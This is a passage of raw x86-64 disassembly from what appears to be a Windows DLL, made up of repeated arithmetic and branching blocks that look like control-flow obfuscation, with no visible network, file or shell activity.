   18000403a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004040:	f7 e9                	imul   %ecx
   180004042:	d1 fa                	sar    $1,%edx
   180004044:	8b c2                	mov    %edx,%eax
   180004046:	c1 e8 1f             	shr    $0x1f,%eax
   180004049:	03 d0                	add    %eax,%edx
   18000404b:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000404e:	3b c8                	cmp    %eax,%ecx
   180004050:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004056:	74 04                	je     0x18000405c
   180004058:	2b c3                	sub    %ebx,%eax
   18000405a:	eb 02                	jmp    0x18000405e
   18000405c:	03 c3                	add    %ebx,%eax
   18000405e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004064:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000406a:	41 23 c2             	and    %r10d,%eax
   18000406d:	7d 07                	jge    0x180004076
   18000406f:	2b c3                	sub    %ebx,%eax
   180004071:	83 c8 fe             	or     $0xfffffffe,%eax
   180004074:	03 c3                	add    %ebx,%eax
   180004076:	85 c0                	test   %eax,%eax
   180004078:	74 ad                	je     0x180004027
   18000407a:	eb 7f                	jmp    0x1800040fb
   18000407c:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004081:	f7 e9                	imul   %ecx
   180004083:	d1 fa                	sar    $1,%edx
   180004085:	8b c2                	mov    %edx,%eax
   180004087:	c1 e8 1f             	shr    $0x1f,%eax
   18000408a:	03 d0                	add    %eax,%edx
   18000408c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000408f:	3b c8                	cmp    %eax,%ecx
   180004091:	74 68                	je     0x1800040fb
   180004093:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004099:	41 8d 48 17          	lea    0x17(%r8),%ecx
   18000409d:	83 c0 0b             	add    $0xb,%eax
   1800040a0:	99                   	cltd
   1800040a1:	f7 f9                	idiv   %ecx
   1800040a3:	eb 37                	jmp    0x1800040dc
   1800040a5:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800040ab:	03 c3                	add    %ebx,%eax
   1800040ad:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800040b3:	b8 67 66 66 66       	mov    $0x66666667,%eax
   1800040b8:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800040be:	f7 e9                	imul   %ecx
   1800040c0:	d1 fa                	sar    $1,%edx
   1800040c2:	8b c2                	mov    %edx,%eax
   1800040c4:	c1 e8 1f             	shr    $0x1f,%eax
   1800040c7:	03 d0                	add    %eax,%edx
   1800040c9:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800040cc:	3b c8                	cmp    %eax,%ecx
   1800040ce:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800040d4:	74 04                	je     0x1800040da
   1800040d6:	03 c3                	add    %ebx,%eax
   1800040d8:	eb 02                	jmp    0x1800040dc
   1800040da:	2b c3                	sub    %ebx,%eax
   1800040dc:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800040e2:	41 8b c1             	mov    %r9d,%eax
   1800040e5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800040eb:	f7 e9                	imul   %ecx
   1800040ed:	8b c2                	mov    %edx,%eax
   1800040ef:	c1 e8 1f             	shr    $0x1f,%eax
   1800040f2:	03 d0                	add    %eax,%edx
   1800040f4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800040f7:	3b c8                	cmp    %eax,%ecx
   1800040f9:	74 aa                	je     0x1800040a5
   1800040fb:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   180004100:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180004105:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000410b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004111:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180004117:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000411d:	03 c8                	add    %eax,%ecx
   18000411f:	41 8b c1             	mov    %r9d,%eax
   180004122:	f7 e9                	imul   %ecx
   180004124:	8b c2                	mov    %edx,%eax
   180004126:	c1 e8 1f             	shr    $0x1f,%eax
   180004129:	03 d0                	add    %eax,%edx
   18000412b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000412e:	3b c8                	cmp    %eax,%ecx
   180004130:	74 4a                	je     0x18000417c
   180004132:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004138:	41 03 cf             	add    %r15d,%ecx
   18000413b:	41 03 c8             	add    %r8d,%ecx
   18000413e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004144:	eb 1c                	jmp    0x180004162
   180004146:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000414c:	03 c3                	add    %ebx,%eax
   18000414e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004154:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000415a:	03 c3                	add    %ebx,%eax
   18000415c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004162:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004168:	23 c6                	and    %esi,%eax
   18000416a:	7d 07                	jge    0x180004173
   18000416c:	2b c3                	sub    %ebx,%eax
   18000416e:	83 c8 fc             	or     $0xfffffffc,%eax
   180004171:	03 c3                	add    %ebx,%eax
   180004173:	85 c0                	test   %eax,%eax
   180004175:	74 cf                	je     0x180004146
   180004177:	e9 61 01 00 00       	jmp    0x1800042dd
   18000417c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004182:	41 23 c2             	and    %r10d,%eax
   180004185:	7d 07                	jge    0x18000418e
   180004187:	2b c3                	sub    %ebx,%eax
   180004189:	83 c8 fe             	or     $0xfffffffe,%eax
   18000418c:	03 c3                	add    %ebx,%eax
   18000418e:	85 c0                	test   %eax,%eax
   180004190:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004196:	74 4a                	je     0x1800041e2
   180004198:	41 8b cf             	mov    %r15d,%ecx
   18000419b:	41 2b c8             	sub    %r8d,%ecx
   18000419e:	03 c8                	add    %eax,%ecx
   1800041a0:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800041a6:	eb 1c                	jmp    0x1800041c4
   1800041a8:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800041ae:	03 c3                	add    %ebx,%eax
   1800041b0:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800041b6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800041bc:	03 c3                	add    %ebx,%eax
   1800041be:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800041c4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800041ca:	41 8b c1             	mov    %r9d,%eax
   1800041cd:	f7 e9                	imul   %ecx
   1800041cf:	8b c2                	mov    %edx,%eax
   1800041d1:	c1 e8 1f             	shr    $0x1f,%eax
   1800041d4:	03 d0                	add    %eax,%edx
   1800041d6:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800041d9:	3b c8                	cmp    %eax,%ecx
   1800041db:	74 cb                	je     0x1800041a8
   1800041dd:	e9 fb 00 00 00       	jmp    0x1800042dd
   1800041e2:	23 c6                	and    %esi,%eax
   1800041e4:	7d 07                	jge    0x1800041ed
   1800041e6:	2b c3                	sub    %ebx,%eax
   1800041e8:	83 c8 fc             	or     $0xfffffffc,%eax
   1800041eb:	03 c3                	add    %ebx,%eax
   1800041ed:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800041f3:	85 c0                	test   %eax,%eax
   1800041f5:	74 67                	je     0x18000425e
   1800041f7:	41 03 cf             	add    %r15d,%ecx
   1800041fa:	41 8d 40 03          	lea    0x3(%r8),%eax
   1800041fe:	0f af c8             	imul   %eax,%ecx
   180004201:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004207:	eb 3d                	jmp    0x180004246
   180004209:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000420f:	03 c3                	add    %ebx,%eax
   180004211:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004217:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000421c:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004222:	f7 e9                	imul   %ecx
   180004224:	d1 fa                	sar    $1,%edx
   180004226:	8b c2                	mov    %edx,%eax
   180004228:	c1 e8 1f             	shr    $0x1f,%eax
   18000422b:	03 d0                	add    %eax,%edx
   18000422d:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004230:	3b c8                	cmp    %eax,%ecx
   180004232:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004238:	74 04                	je     0x18000423e
   18000423a:	2b c3                	sub    %ebx,%eax
   18000423c:	eb 02                	jmp    0x180004240
   18000423e:	03 c3                	add    %ebx,%eax
   180004240:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004246:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000424c:	41 23 c2             	and    %r10d,%eax
   18000424f:	7d 07                	jge    0x180004258
   180004251:	2b c3                	sub    %ebx,%eax
   180004253:	83 c8 fe             	or     $0xfffffffe,%eax
   180004256:	03 c3                	add    %ebx,%eax
   180004258:	85 c0                	test   %eax,%eax
   18000425a:	74 ad                	je     0x180004209
   18000425c:	eb 7f                	jmp    0x1800042dd
   18000425e:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004263:	f7 e9                	imul   %ecx
   180004265:	d1 fa                	sar    $1,%edx
   180004267:	8b c2                	mov    %edx,%eax
   180004269:	c1 e8 1f             	shr    $0x1f,%eax
   18000426c:	03 d0                	add    %eax,%edx
   18000426e:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180004271:	3b c8                	cmp    %eax,%ecx
   180004273:	74 68                	je     0x1800042dd
   180004275:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000427b:	41 8d 48 17          	lea    0x17(%r8),%ecx
   18000427f:	83 c0 0b             	add    $0xb,%eax
   180004282:	99                   	cltd
   180004283:	f7 f9                	idiv   %ecx
   180004285:	eb 37                	jmp    0x1800042be
   180004287:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000428d:	03 c3                	add    %ebx,%eax
   18000428f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004295:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000429a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800042a0:	f7 e9                	imul   %ecx
   1800042a2:	d1 fa                	sar    $1,%edx
   1800042a4:	8b c2                	mov    %edx,%eax
   1800042a6:	c1 e8 1f             	shr    $0x1f,%eax
   1800042a9:	03 d0                	add    %eax,%edx
   1800042ab:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800042ae:	3b c8                	cmp    %eax,%ecx
   1800042b0:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800042b6:	74 04                	je     0x1800042bc
   1800042b8:	03 c3                	add    %ebx,%eax
   1800042ba:	eb 02                	jmp    0x1800042be
   1800042bc:	2b c3                	sub    %ebx,%eax
   1800042be:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800042c4:	41 8b c1             	mov    %r9d,%eax
   1800042c7:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800042cd:	f7 e9                	imul   %ecx
   1800042cf:	8b c2                	mov    %edx,%eax
   1800042d1:	c1 e8 1f             	shr    $0x1f,%eax
   1800042d4:	03 d0                	add    %eax,%edx
   1800042d6:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800042d9:	3b c8                	cmp    %eax,%ecx
   1800042db:	74 aa                	je     0x180004287
   1800042dd:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800042e1:	41 0f af c4          	imul   %r12d,%eax
   1800042e5:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1800042e9:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800042ee:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   1800042f3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800042f9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800042ff:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180004305:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000430b:	03 c8                	add    %eax,%ecx
   18000430d:	41 8b c1             	mov    %r9d,%eax
   180004310:	f7 e9                	imul   %ecx
   180004312:	8b c2                	mov    %edx,%eax
   180004314:	c1 e8 1f             	shr    $0x1f,%eax
   180004317:	03 d0                	add    %eax,%edx
   180004319:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000431c:	3b c8                	cmp    %eax,%ecx
   18000431e:	74 4a                	je     0x18000436a
   180004320:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004326:	41 03 cf             	add    %r15d,%ecx
   180004329:	41 03 c8             	add    %r8d,%ecx
   18000432c:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004332:	eb 1c                	jmp    0x180004350
   180004334:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000433a:	03 c3                	add    %ebx,%eax
   18000433c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004342:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004348:	03 c3                	add    %ebx,%eax
   18000434a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004350:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004356:	23 c6                	and    %esi,%eax
   180004358:	7d 07                	jge    0x180004361
   18000435a:	2b c3                	sub    %ebx,%eax
   18000435c:	83 c8 fc             	or     $0xfffffffc,%eax
   18000435f:	03 c3                	add    %ebx,%eax
   180004361:	85 c0                	test   %eax,%eax
   180004363:	74 cf                	je     0x180004334
   180004365:	e9 61 01 00 00       	jmp    0x1800044cb
   18000436a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004370:	41 23 c2             	and    %r10d,%eax
   180004373:	7d 07                	jge    0x18000437c
   180004375:	2b c3                	sub    %ebx,%eax
   180004377:	83 c8 fe             	or     $0xfffffffe,%eax
   18000437a:	03 c3                	add    %ebx,%eax
   18000437c:	85 c0                	test   %eax,%eax
   18000437e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004384:	74 4a                	je     0x1800043d0
   180004386:	41 8b cf             	mov    %r15d,%ecx
   180004389:	41 2b c8             	sub    %r8d,%ecx
   18000438c:	03 c8                	add    %eax,%ecx
   18000438e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004394:	eb 1c                	jmp    0x1800043b2
   180004396:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000439c:	03 c3                	add    %ebx,%eax
   18000439e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800043a4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800043aa:	03 c3                	add    %ebx,%eax
   1800043ac:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800043b2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800043b8:	41 8b c1             	mov    %r9d,%eax
   1800043bb:	f7 e9                	imul   %ecx
   1800043bd:	8b c2                	mov    %edx,%eax
   1800043bf:	c1 e8 1f             	shr    $0x1f,%eax
   1800043c2:	03 d0                	add    %eax,%edx
   1800043c4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800043c7:	3b c8                	cmp    %eax,%ecx
   1800043c9:	74 cb                	je     0x180004396
   1800043cb:	e9 fb 00 00 00       	jmp    0x1800044cb
   1800043d0:	23 c6                	and    %esi,%eax
   1800043d2:	7d 07                	jge    0x1800043db
   1800043d4:	2b c3                	sub    %ebx,%eax
   1800043d6:	83 c8 fc             	or     $0xfffffffc,%eax
   1800043d9:	03 c3                	add    %ebx,%eax
   1800043db:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800043e1:	85 c0                	test   %eax,%eax
   1800043e3:	74 67                	je     0x18000444c
   1800043e5:	41 03 cf             	add    %r15d,%ecx
   1800043e8:	41 8d 40 03          	lea    0x3(%r8),%eax
   1800043ec:	0f af c8             	imul   %eax,%ecx
   1800043ef:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800043f5:	eb 3d                	jmp    0x180004434
   1800043f7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800043fd:	03 c3                	add    %ebx,%eax
   1800043ff:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004405:	b8 67 66 66 66       	mov    $0x66666667,%eax
   18000440a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004410:	f7 e9                	imul   %ecx
   180004412:	d1 fa                	sar    $1,%edx
   180004414:	8b c2                	mov    %edx,%eax
   180004416:	c1 e8 1f             	shr    $0x1f,%eax
   180004419:	03 d0                	add    %eax,%edx
   18000441b:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000441e:	3b c8                	cmp    %eax,%ecx
   180004420:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004426:	74 04                	je     0x18000442c
   180004428:	2b c3                	sub    %ebx,%eax
   18000442a:	eb 02                	jmp    0x18000442e
   18000442c:	03 c3                	add    %ebx,%eax
   18000442e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004434:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000443a:	41 23 c2             	and    %r10d,%eax
   18000443d:	7d 07                	jge    0x180004446
   18000443f:	2b c3                	sub    %ebx,%eax
   180004441:	83 c8 fe             	or     $0xfffffffe,%eax
   180004444:	03 c3                	add    %ebx,%eax
   180004446:	85 c0                	test   %eax,%eax
   180004448:	74 ad                	je     0x1800043f7
   18000444a:	eb 7f                	jmp    0x1800044cb
   18000444c:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004451:	f7 e9                	imul   %ecx
   180004453:	d1 fa                	sar    $1,%edx
   180004455:	8b c2                	mov    %edx,%eax
   180004457:	c1 e8 1f             	shr    $0x1f,%eax
   18000445a:	03 d0                	add    %eax,%edx
   18000445c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000445f:	3b c8                	cmp    %eax,%ecx
   180004461:	74 68                	je     0x1800044cb
   180004463:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004469:	41 8d 48 17          	lea    0x17(%r8),%ecx
   18000446d:	83 c0 0b             	add    $0xb,%eax
   180004470:	99                   	cltd
   180004471:	f7 f9                	idiv   %ecx
   180004473:	eb 37                	jmp    0x1800044ac
   180004475:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000447b:	03 c3                	add    %ebx,%eax
   18000447d:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004483:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004488:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000448e:	f7 e9                	imul   %ecx
   180004490:	d1 fa                	sar    $1,%edx
   180004492:	8b c2                	mov    %edx,%eax
   180004494:	c1 e8 1f             	shr    $0x1f,%eax
   180004497:	03 d0                	add    %eax,%edx
   180004499:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000449c:	3b c8                	cmp    %eax,%ecx
   18000449e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800044a4:	74 04                	je     0x1800044aa
   1800044a6:	03 c3                	add    %ebx,%eax
   1800044a8:	eb 02                	jmp    0x1800044ac
   1800044aa:	2b c3                	sub    %ebx,%eax
   1800044ac:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800044b2:	41 8b c1             	mov    %r9d,%eax
   1800044b5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800044bb:	f7 e9                	imul   %ecx
   1800044bd:	8b c2                	mov    %edx,%eax
   1800044bf:	c1 e8 1f             	shr    $0x1f,%eax
   1800044c2:	03 d0                	add    %eax,%edx
   1800044c4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800044c7:	3b c8                	cmp    %eax,%ecx
   1800044c9:	74 aa                	je     0x180004475
   1800044cb:	8b 4c 24 24          	mov    0x24(%rsp),%ecx
   1800044cf:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800044d3:	03 c8                	add    %eax,%ecx
   1800044d5:	89 4c 24 24          	mov    %ecx,0x24(%rsp)
   1800044d9:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800044de:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   1800044e3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800044e9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800044ef:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800044f5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800044fb:	03 c8                	add    %eax,%ecx
   1800044fd:	41 8b c1             	mov    %r9d,%eax
   180004500:	f7 e9                	imul   %ecx
   180004502:	8b c2                	mov    %edx,%eax
   180004504:	c1 e8 1f             	shr    $0x1f,%eax
   180004507:	03 d0                	add    %eax,%edx
   180004509:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000450c:	3b c8                	cmp    %eax,%ecx
   18000450e:	74 4a                	je     0x18000455a
   180004510:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004516:	41 03 cf             	add    %r15d,%ecx
   180004519:	41 03 c8             	add    %r8d,%ecx
   18000451c:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004522:	eb 1c                	jmp    0x180004540
   180004524:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000452a:	03 c3                	add    %ebx,%eax
   18000452c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004532:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180004538:	03 c3                	add    %ebx,%eax
   18000453a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004540:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004546:	23 c6                	and    %esi,%eax
   180004548:	7d 07                	jge    0x180004551
   18000454a:	2b c3                	sub    %ebx,%eax
   18000454c:	83 c8 fc             	or     $0xfffffffc,%eax
   18000454f:	03 c3                	add    %ebx,%eax
   180004551:	85 c0                	test   %eax,%eax
   180004553:	74 cf                	je     0x180004524
   180004555:	e9 61 01 00 00       	jmp    0x1800046bb
   18000455a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004560:	41 23 c2             	and    %r10d,%eax
   180004563:	7d 07                	jge    0x18000456c
   180004565:	2b c3                	sub    %ebx,%eax
   180004567:	83 c8 fe             	or     $0xfffffffe,%eax
   18000456a:	03 c3                	add    %ebx,%eax
   18000456c:	85 c0                	test   %eax,%eax
   18000456e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004574:	74 4a                	je     0x1800045c0
   180004576:	41 8b cf             	mov    %r15d,%ecx
   180004579:	41 2b c8             	sub    %r8d,%ecx
   18000457c:	03 c8                	add    %eax,%ecx
   18000457e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180004584:	eb 1c                	jmp    0x1800045a2
   180004586:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000458c:	03 c3                	add    %ebx,%eax
   18000458e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004594:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000459a:	03 c3                	add    %ebx,%eax
   18000459c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800045a2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800045a8:	41 8b c1             	mov    %r9d,%eax
   1800045ab:	f7 e9                	imul   %ecx
   1800045ad:	8b c2                	mov    %edx,%eax
   1800045af:	c1 e8 1f             	shr    $0x1f,%eax
   1800045b2:	03 d0                	add    %eax,%edx
   1800045b4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800045b7:	3b c8                	cmp    %eax,%ecx
   1800045b9:	74 cb                	je     0x180004586
   1800045bb:	e9 fb 00 00 00       	jmp    0x1800046bb
   1800045c0:	23 c6                	and    %esi,%eax
   1800045c2:	7d 07                	jge    0x1800045cb
   1800045c4:	2b c3                	sub    %ebx,%eax
   1800045c6:	83 c8 fc             	or     $0xfffffffc,%eax
   1800045c9:	03 c3                	add    %ebx,%eax
   1800045cb:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800045d1:	85 c0                	test   %eax,%eax
   1800045d3:	74 67                	je     0x18000463c
   1800045d5:	41 03 cf             	add    %r15d,%ecx
   1800045d8:	41 8d 40 03          	lea    0x3(%r8),%eax
   1800045dc:	0f af c8             	imul   %eax,%ecx
   1800045df:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800045e5:	eb 3d                	jmp    0x180004624
   1800045e7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800045ed:	03 c3                	add    %ebx,%eax
   1800045ef:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800045f5:	b8 67 66 66 66       	mov    $0x66666667,%eax
   1800045fa:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180004600:	f7 e9                	imul   %ecx
   180004602:	d1 fa                	sar    $1,%edx
   180004604:	8b c2                	mov    %edx,%eax
   180004606:	c1 e8 1f             	shr    $0x1f,%eax
   180004609:	03 d0                	add    %eax,%edx
   18000460b:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000460e:	3b c8                	cmp    %eax,%ecx
   180004610:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004616:	74 04                	je     0x18000461c
   180004618:	2b c3                	sub    %ebx,%eax
   18000461a:	eb 02                	jmp    0x18000461e
   18000461c:	03 c3                	add    %ebx,%eax
   18000461e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180004624:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000462a:	41 23 c2             	and    %r10d,%eax
   18000462d:	7d 07                	jge    0x180004636
   18000462f:	2b c3                	sub    %ebx,%eax
   180004631:	83 c8 fe             	or     $0xfffffffe,%eax
   180004634:	03 c3                	add    %ebx,%eax
   180004636:	85 c0                	test   %eax,%eax
   180004638:	74 ad                	je     0x1800045e7
   18000463a:	eb 7f                	jmp    0x1800046bb
   18000463c:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004641:	f7 e9                	imul   %ecx
   180004643:	d1 fa                	sar    $1,%edx
   180004645:	8b c2                	mov    %edx,%eax
   180004647:	c1 e8 1f             	shr    $0x1f,%eax
   18000464a:	03 d0                	add    %eax,%edx
   18000464c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000464f:	3b c8                	cmp    %eax,%ecx
   180004651:	74 68                	je     0x1800046bb
   180004653:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004659:	41 8d 48 17          	lea    0x17(%r8),%ecx
   18000465d:	83 c0 0b             	add    $0xb,%eax
   180004660:	99                   	cltd
   180004661:	f7 f9                	idiv   %ecx
   180004663:	eb 37                	jmp    0x18000469c
   180004665:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000466b:	03 c3                	add    %ebx,%eax
   18000466d:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180004673:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180004678:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000467e:	f7 e9                	imul   %ecx
   180004680:	d1 fa                	sar    $1,%edx
   180004682:	8b c2                	mov    %edx,%eax
   180004684:	c1 e8 1f             	shr    $0x1f,%eax
   180004687:	03 d0                	add    %eax,%edx
   180004689:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000468c:	3b c8                	cmp    %eax,%ecx
   18000468e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180004694:	74 04                	je     0x18000469a
   180004696:	03 c3                	add    %ebx,%eax
   180004698:	eb 02                	jmp    0x18000469c
   18000469a:	2b c3                	sub    %ebx,%eax
   18000469c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800046a2:	41 8b c1             	mov    %r9d,%eax
   1800046a5:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800046ab:	f7 e9                	imul   %ecx
   1800046ad:	8b c2                	mov    %edx,%eax
   1800046af:	c1 e8 1f             	shr    $0x1f,%eax
   1800046b2:	03 d0                	add    %eax,%edx
   1800046b4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800046b7:	3b c8                	cmp    %eax,%ecx
   1800046b9:	74 aa                	je     0x180004665
   1800046bb:	8b 44 24 24          	mov    0x24(%rsp),%eax
   1800046bf:	42 8a 0c 18          	mov    (%rax,%r11,1),%cl
   1800046c3:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800046c8:	88 8d 80 01 00 00    	mov    %cl,0x180(%rbp)
   1800046ce:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   1800046d3:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800046d9:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1800046dd:	8b 4c 24 24          	mov    0x24(%rsp),%ecx
   1800046e1:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800046e7:	03 c8                	add    %eax,%ecx
   1800046e9:	41 8b c1             	mov    %r9d,%eax
